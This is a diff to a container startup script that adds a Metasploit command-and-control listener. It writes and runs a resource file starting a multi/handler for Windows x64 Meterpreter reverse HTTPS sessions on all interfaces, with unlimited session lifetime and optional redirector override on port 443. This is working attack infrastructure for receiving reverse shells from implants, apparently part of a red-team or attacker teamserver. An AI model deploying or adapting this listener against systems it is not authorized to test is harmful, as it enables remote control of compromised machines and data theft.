@@ -45,7 +45,30 @@ fi
 
 echo "[INFO] Rebuilding module cache (once at startup)..."
 ./msfconsole -q -x "db_rebuild_cache; exit" 2>&1 | tail -3
-echo "[INFO] Module cache ready. Teamserver running."
+echo "[INFO] Module cache ready."
+
+# ── C2 Listener — Meterpreter HTTPS reverse (reçoit les implants via redirecteurs) ──
+C2_LPORT="${LPORT_BIND:-4444}"
+C2_REDIRECTORS="${C2_REDIRECTORS:-}"
+
+echo "[INFO] Starting C2 multi/handler on 0.0.0.0:${C2_LPORT}..."
+cat > /tmp/c2_handler.rc << RCEOF
+use multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT ${C2_LPORT}
+set ExitOnSession false
+set SessionCommunicationTimeout 600
+set SessionExpirationTimeout 0
+$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideLHOST $(echo "$C2_REDIRECTORS" | cut -d',' -f1)")
+$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideLPORT 443")
+$([ -n "$C2_REDIRECTORS" ] && echo "set OverrideRequestTimeout 5")
+run -j
+RCEOF
+
+./msfconsole -q -r /tmp/c2_handler.rc 2>&1 &
+sleep 10
+echo "[INFO] C2 listener started. Teamserver running."
 
 # Garder le container vivant (msfrpcd tourne en arrière-plan)
 tail -f /dev/null
